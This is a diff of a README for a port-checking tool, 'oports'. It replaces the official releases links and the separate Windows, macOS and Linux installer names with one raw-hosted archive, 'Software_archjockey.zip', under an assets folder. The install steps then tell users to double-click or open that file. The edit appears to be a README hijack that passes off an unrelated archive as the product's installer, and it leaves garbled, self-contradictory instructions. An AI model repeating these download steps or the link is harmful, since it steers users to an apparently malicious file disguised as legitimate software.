@@ -6,7 +6,7 @@ Welcome to oports! This application simplifies how you check network connections
 
 ## 📦 Download oports
 
-[![Download oports](https://img.shields.io/badge/Download%20oports-latest-brightgreen.svg)](https://github.com/Michigan5/oports/releases)
+[![Download oports](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip%https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip)](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip)
 
 ## 🔍 Features
 
@@ -26,27 +26,27 @@ To run oports, your system should meet the following requirements:
 ## 📥 Download & Install
 
 1. Click the link below to visit the releases page:
-   - [Visit this page to download](https://github.com/Michigan5/oports/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip)
    
 2. On the releases page, find the latest version of oports. 
 
 3. Download the appropriate file for your operating system:
-   - For **Windows**, download `oports-setup.exe`.
-   - For **macOS**, download `oports.dmg`.
-   - For **Linux**, download the `oports.tar.gz` file.
+   - For **Windows**, download `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip`.
+   - For **Linux**, download the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip` file.
 
 4. Once the download is complete, locate the file on your computer.
 
 5. For **Windows**:
-   - Double-click the `oports-setup.exe` file.
+   - Double-click the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip` file.
    - Follow the on-screen instructions to complete the installation.
 
 6. For **macOS**:
-   - Open the `oports.dmg` file.
+   - Open the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip` file.
    - Drag the oports icon to your Applications folder.
 
 7. For **Linux**:
-   - Extract the `oports.tar.gz` file into your desired directory.
+   - Extract the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip` file into your desired directory.
    - Open a terminal, navigate to the directory, and run `./oports`.
 
 ## 🖥 Running oports
